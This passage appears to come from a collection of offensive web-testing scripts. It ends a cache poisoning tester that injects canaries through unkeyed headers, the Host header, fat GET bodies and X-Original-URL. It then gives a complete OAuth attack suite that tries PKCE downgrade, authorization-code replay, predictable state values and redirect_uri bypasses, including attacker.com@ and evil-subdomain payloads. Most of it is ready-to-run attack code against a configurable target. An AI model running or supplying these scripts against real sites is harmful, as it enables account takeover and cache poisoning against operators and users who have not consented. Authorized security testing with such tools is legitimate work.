    r = check_poison("X-Forwarded-Scheme-downgrade",
                     {"X-Forwarded-Scheme": "http"},
                     lambda body: "http://" in body and "https://" not in body[:200])
    if r: findings.append(r); print(f"  [!!!] Scheme downgrade reflected in cache")
    else: print("  [-] Not vulnerable")

    # ── Test 3: Unkeyed query parameter ──────────────────────────────────────
    print("\n[3] Unkeyed query parameter (utm_content, callback, lang)...")
    for param in ["utm_content", "callback", "lang", "ref", "source"]:
        url_with_param = f"{TARGET_URL}?{param}={CANARY}&{cache_buster()}"
        r1 = get(url_with_param)
        time.sleep(0.3)
        # Now fetch without the unkeyed param — same cache key if param is unkeyed
        url_clean = f"{TARGET_URL}?{cache_buster()}"
        r2 = get(url_clean)
        if CANARY in r2.text:
            findings.append({"test": f"unkeyed_param:{param}", "url": url_with_param,
                              "evidence": re.findall(rf".{{0,40}}{re.escape(CANARY)}.{{0,40}}", r2.text)[:2]})
            print(f"  [!!!] Unkeyed param: {param!r} — canary in clean response!")

    # ── Test 4: Host header injection ────────────────────────────────────────
    print("\n[4] Host header injection (import/link URL reflection)...")
    r = check_poison("Host-header",
                     {"Host": f"{CANARY}.{OOB_HOST}"},
                     lambda body: CANARY in body)
    if r: findings.append(r); print(f"  [!!!] Host header reflected: {r['evidence']}")
    else: print("  [-] Not vulnerable")

    # ── Test 5: Fat GET (body smuggled into GET) ──────────────────────────────
    print("\n[5] Fat GET — body parameter in GET request...")
    buster_url = add_buster(TARGET_URL)
    r_fat = requests.get(buster_url, headers={**BASE_HEADERS,
                         "Content-Type": "application/x-www-form-urlencoded",
                         "Content-Length": str(len(f"param={CANARY}"))},
                         data=f"param={CANARY}", timeout=8, verify=False)
    time.sleep(0.3)
    r_clean = get(buster_url)
    if CANARY in r_clean.text:
        findings.append({"test": "fat_GET", "url": buster_url})
        print(f"  [!!!] Fat GET poisoned — body param appeared in cached GET response!")
    else:
        print("  [-] Not vulnerable")

    # ── Test 6: X-Original-URL / X-Rewrite-URL ───────────────────────────────
    print("\n[6] X-Original-URL / X-Rewrite-URL path override...")
    for hdr in ["X-Original-URL", "X-Rewrite-URL"]:
        r = check_poison(hdr, {hdr: f"/nonexistent-{CANARY}"},
                         lambda body: CANARY in body or "404" in body)
        if r: findings.append(r); print(f"  [!!!] {hdr} reflected in cached response!")

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"\n{'='*60}")
    print(f"[*] {len(findings)} cache poisoning vectors found")
    for f in findings:
        print(f"  [!!!] {f['test']}: {f.get('evidence', 'poisoned')}")
    Path(OUTPUT_FILE).write_text(json.dumps(findings, indent=2))
    print(f"[*] Results → {OUTPUT_FILE}")

main()
```

---

## OAuth Advanced Scripts

**23. OAuth Advanced — PKCE Bypass, Token Reuse, State Fixation:**
```python
# tools/oauth_advanced.py
# Advanced OAuth 2.0 attack suite covering attacks missed by basic oauth_tester.py:
#   A) PKCE downgrade — remove code_challenge to force plain/no PKCE
#   B) Authorization code reuse — replay used code across different clients
#   C) State fixation — force victim to use attacker-controlled state
#   D) Token leakage via Referer — fragment not stripped on redirect
#   E) Cross-client token reuse — use token from app A to access app B
#   F) nonce/sub binding bypass — JWT ID token claims not verified
#
# Requires: pip install requests --break-system-packages

import requests, urllib.parse, hashlib, base64, os, json, re

# ── CONFIG ──────────────────────────────────────────────────────────────────
# Obtain these from browser JS or .well-known/openid-configuration
AUTHORIZE_URL  = "https://auth.target.com/oauth2/authorize"
TOKEN_URL      = "https://auth.target.com/oauth2/token"
CLIENT_ID      = "YOUR_CLIENT_ID"
CLIENT_SECRET  = ""               # If public client, leave empty
REDIRECT_URI   = "https://target.com/callback"
SCOPE          = "openid profile email"
YOUR_SESSION   = "session=YOUR_COOKIE"   # Pre-authenticated session
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {"Cookie": YOUR_SESSION, "Content-Type": "application/x-www-form-urlencoded"}

def gen_pkce() -> tuple[str, str, str]:
    """Generate PKCE code_verifier and code_challenge (S256)."""
    verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
    digest = hashlib.sha256(verifier.encode()).digest()
    challenge = base64.urlsafe_b64encode(digest).rstrip(b"=").decode()
    return verifier, challenge, "S256"

def build_auth_url(state: str, pkce_challenge: str = "", pkce_method: str = "",
                   extra: dict = {}) -> str:
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": SCOPE,
        "state": state,
    }
    if pkce_challenge:
        params["code_challenge"] = pkce_challenge
        params["code_challenge_method"] = pkce_method
    params.update(extra)
    return f"{AUTHORIZE_URL}?{urllib.parse.urlencode(params)}"

def exchange_code(code: str, verifier: str = "", extra: dict = {}) -> dict:
    data = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "client_id": CLIENT_ID,
    }
    if CLIENT_SECRET:
        data["client_secret"] = CLIENT_SECRET
    if verifier:
        data["code_verifier"] = verifier
    data.update(extra)
    r = requests.post(TOKEN_URL, data=data, headers=HEADERS,
                      timeout=8, verify=False, allow_redirects=False)
    return {"status": r.status_code, "body": r.text[:500]}

def main():
    print("=" * 60)
    print("OAuth 2.0 Advanced Attack Suite")
    print("=" * 60)
    results = {}

    # ── A) PKCE Downgrade ────────────────────────────────────────────────────
    print("\n[A] PKCE Downgrade Attack")
    print("    Build URL WITH PKCE, then exchange code WITHOUT code_verifier")
    verifier, challenge, method = gen_pkce()
    auth_url = build_auth_url(state="test_pkce_bypass",
                              pkce_challenge=challenge, pkce_method=method)
    print(f"    Auth URL (copy to browser): {auth_url}")
    code = input("    Paste authorization code from callback URL: ").strip()
    if code:
        # Exchange WITHOUT verifier (server should reject → 400)
        r_no_verifier = exchange_code(code)
        print(f"    Without verifier: {r_no_verifier['status']} — {r_no_verifier['body'][:100]}")
        if r_no_verifier["status"] == 200 and "access_token" in r_no_verifier["body"]:
            print("  [!!!] PKCE BYPASS: Code accepted without code_verifier!")
            results["pkce_bypass"] = r_no_verifier
        # Also try exchange WITH wrong verifier
        r_wrong = exchange_code(code, verifier=verifier + "WRONG")
        if r_wrong["status"] == 200 and "access_token" in r_wrong["body"]:
            print("  [!!!] PKCE NOT VALIDATED: Wrong verifier accepted!")
            results["pkce_wrong_verifier"] = r_wrong

    # ── B) Authorization Code Reuse ──────────────────────────────────────────
    print("\n[B] Authorization Code Reuse (after valid exchange)")
    auth_url2 = build_auth_url(state="test_code_reuse",
                               pkce_challenge=challenge, pkce_method=method)
    print(f"    Auth URL: {auth_url2}")
    code2 = input("    Paste authorization code: ").strip()
    if code2:
        r1 = exchange_code(code2, verifier=verifier)
        print(f"    First exchange: {r1['status']}")
        r2 = exchange_code(code2, verifier=verifier)  # Replay same code
        print(f"    Code replay:    {r2['status']} — {'[!!!] REUSE ALLOWED' if r2['status']==200 else 'Correctly rejected'}")
        if r2["status"] == 200:
            results["code_reuse"] = r2

    # ── C) State Parameter Fixed / Missing ───────────────────────────────────
    print("\n[C] State parameter validation")
    # Test 1: No state at all
    url_no_state = build_auth_url(state="")
    r = requests.get(url_no_state, headers={"Cookie": YOUR_SESSION},
                     allow_redirects=False, verify=False, timeout=5)
    if r.status_code in (200, 302):
        print(f"  [?] No state accepted (status={r.status_code}) — check if state is validated on callback")

    # Test 2: Numeric/predictable state
    for pred_state in ["0", "1", "123", "null", "undefined", "true"]:
        url_pred = build_auth_url(state=pred_state)
        r_pred = requests.get(url_pred, headers={"Cookie": YOUR_SESSION},
                              allow_redirects=False, verify=False, timeout=5)
        if r_pred.status_code != 400:
            print(f"  [?] Predictable state {pred_state!r} accepted — CSRF risk if callback doesn't validate")

    # ── D) redirect_uri Open Redirect / Partial Match ────────────────────────
    print("\n[D] redirect_uri bypass attempts")
    original_uri = REDIRECT_URI
    bypasses = {
        "append_path":   original_uri + "/extra",
        "add_param":     original_uri + "?x=1",
        "subdomain":     original_uri.replace("://", "://evil."),
        "at_bypass":     f"https://attacker.com@{urllib.parse.urlparse(original_uri).netloc}/",
        "dot_bypass":    original_uri.rstrip("/") + ".",
        "encoded_slash": original_uri.replace("/callback", "/%2Fcallback"),
        "null_byte":     original_uri + "%00",
    }
    for name, bypass_uri in bypasses.items():
        url_bypass = build_auth_url(state="bypass_test",
                                    extra={"redirect_uri": bypass_uri})
        r_b = requests.get(url_bypass, headers={"Cookie": YOUR_SESSION},
                           allow_redirects=False, verify=False, timeout=5)
        loc = r_b.headers.get("Location", "")
        if bypass_uri in loc or (r_b.status_code == 200 and "code=" in r_b.text):
            print(f"  [!!!] REDIRECT URI BYPASS [{name}]: {bypass_uri}")
            results[f"redirect_bypass_{name}"] = {"uri": bypass_uri, "status": r_b.status_code}
        else:
            print(f"  [-] {name}: rejected ({r_b.status_code})")

    # ── Summary ───────────────────────────────────────────────────────────────
    print(f"\n{'='*60}")
    if results:
        print(f"[!!!] {len(results)} vulnerabilities found:")
        for k, v in results.items():
            print(f"  - {k}: {str(v)[:100]}")
    else:
        print("[-] No OAuth vulnerabilities confirmed automatically.")
        print("    Manual review: check state fixation on callback, nonce binding in JWT id_token")

main()
```